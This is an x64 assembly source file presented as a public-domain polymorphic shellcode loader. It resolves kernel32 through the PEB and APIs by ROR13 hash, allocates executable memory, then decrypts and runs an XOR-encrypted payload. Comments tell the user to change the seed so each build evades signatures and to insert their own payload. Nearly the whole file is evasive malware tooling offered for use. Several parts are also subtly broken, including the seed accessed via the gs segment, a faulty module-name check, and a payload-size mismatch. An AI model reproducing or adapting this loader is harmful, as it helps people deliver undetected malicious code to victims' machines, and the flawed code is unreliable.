; polymorph.asm  —  public domain 2025
; ml64 /c polymorph.asm
; link /subsystem:console /entry:Start polymorph.obj
OPTION DOTNAME
OPTION PROLOGUE:NONE
OPTION EPILOGUE:NONE

; ==================  CONFIG  ==================
; Change these two lines → new binary every build
RANDOM_SEED     EQU 0A7F9C2E5h        ; <-- mutate for polymorphism
PAYLOAD_SIZE    EQU 512               ; max bytes we decrypt/execute
; ==============================================

EXTERN  GetModuleHandleA : PROC
EXTERN  GetProcAddress   : PROC
EXTERN  ExitProcess      : PROC
EXTERN  VirtualAlloc     : PROC
EXTERN  VirtualProtect   : PROC

.code

; ----------  tiny xorshift PRNG  ----------
Rand32  PROC
        mov     eax, gs:[RANDOM_SEED]
        mov     ecx, eax
        shl     eax, 13
        xor     eax, ecx
        mov     ecx, eax
        shr     eax, 17
        xor     eax, ecx
        mov     ecx, eax
        shl     eax, 5
        xor     eax, ecx
        mov     gs:[RANDOM_SEED], eax
        ret
Rand32  ENDP

; ----------  decrypt payload in-place  ----------
DecryptPayload PROC
        mov     rcx, PAYLOAD_SIZE/4           ; dword count
        lea     rsi, EncryptedPayload
DecryptLoop:
        call    Rand32                        ; eax = next key
        xor     [rsi], eax                    ; decrypt dword
        add     rsi, 4
        loop    DecryptLoop
        ret
DecryptPayload ENDP

; ----------  resolve kernel32!API dynamically ----------
GetKernel32 PROC
        mov     rax, gs:[60h]                 ; PEB
        mov     rax, [rax+18h]                ; PEB_LDR_DATA
        mov     rsi, [rax+20h]                ; InMemoryOrder list
NextMod:
        lodsd                                 ; eax = next Flink
        mov     rcx, [rax+50h]                ; BaseDllName.Buffer
        mov     r8d, [rax+48h]                ; Length
        shr     r8d, 1                        ; wchar → char count
        mov     rdi, rcx
        mov     rbx, 0x006C006C               ; "ll"
        mov     rdx, 0x00640065               ; "de"
        mov     r9 , 0x006B0065               ; "ek"
        scasd                                 ; skip first wchar
        scasd
        mov     rax, [rdi-8]
        cmp     eax, edx
        jne     NextMod
        cmp     [rdi], rbx
        jne     NextMod
        mov     rax, [rax+20h]                ; DllBase
        ret
GetKernel32 ENDP

; ----------  resolve any API by hash (classic ROR13) ----------
GetAPI PROC
        ; rcx = module base, rdx = hash
        mov     rbx, rcx                      ; save base
        mov     eax, [rbx+3Ch]                ; e_lfanew
        mov     rsi, rbx
        add     rsi, rax
        mov     esi, [rsi+88h]                ; ExportDirectory RVA
        add     rsi, rbx                      ; VA
        mov     ecx, [rsi+18h]                ; NumberOfNames
        mov     r8d, [rsi+20h]                ; AddressOfNames RVA
        add     r8, rbx
NamesLoop:
        dec     ecx
        mov     edi, [r8+rcx*4]
        add     rdi, rbx
        push    rcx
        call    HashString
        pop     rcx
        cmp     eax, edx
        jne     NamesLoop
        mov     r8d, [rsi+24h]                ; AddressOfNameOrdinals
        add     r8, rbx
        mov     cx , [r8+rcx*2]               ; Ordinal
        mov     r8d, [rsi+1Ch]                ; AddressOfFunctions
        add     r8, rbx
        mov     eax, [r8+rcx*4]               ; Function RVA
        add     rax, rbx
        ret
GetAPI ENDP

HashString PROC
        xor     eax, eax
        cdq
HashLoop:
        lodsb
        test    al, al
        jz      Done
        ror     edx, 13
        add     edx, eax
        jmp     HashLoop
Done:   mov     eax, edx
        ret
HashString ENDP

; ==================  ENTRY  ==================
Start PROC
        ; ----  get kernel32.dll base  ----
        call    GetKernel32
        mov     r15, rax                      ; save for later

        ; ----  resolve VirtualAlloc  ----
        mov     rcx, r15
        mov     rdx, 07C0DFCAAh               ; hash("VirtualAlloc")
        call    GetAPI
        mov     r14, rax

        ; ----  allocate RWX buffer  ----
        xor     ecx, ecx
        mov     edx, PAYLOAD_SIZE
        mov     r8d, 3000h                    ; MEM_COMMIT | MEM_RESERVE
        mov     r9d, 40h                      ; PAGE_EXECUTE_READWRITE
        call    r14
        mov     rdi, rax                      ; destination

        ; ----  copy & decrypt payload  ----
        lea     rsi, EncryptedPayload
        mov     rcx, PAYLOAD_SIZE
        rep     movsb
        call    DecryptPayload

        ; ----  execute decrypted payload  ----
        call    rdi

        ; ----  graceful exit  ----
        mov     rcx, r15
        mov     rdx, 04FD18963h               ; hash("ExitProcess")
        call    GetAPI
        xor     ecx, ecx
        call    rax
Start ENDP

; ==================  DATA  ==================
EncryptedPayload LABEL BYTE
; ---  dummy 32-byte placeholder (replace with your own) ---
; encrypted with key = RANDOM_SEED
        DB  09Eh,05Ch,0A6h,0CCh,0B9h,0E0h,07Bh,02Dh
        DB  066h,0F9h,03Ch,0A4h,0D1h,07Ch,0E8h,0C5h
        DB  012h,034h,056h,078h,09Ah,0BCh,0DEh,0F0h
        DB  011h,033h,055h,077h,099h,0BBh,0DDh,0FFh

END
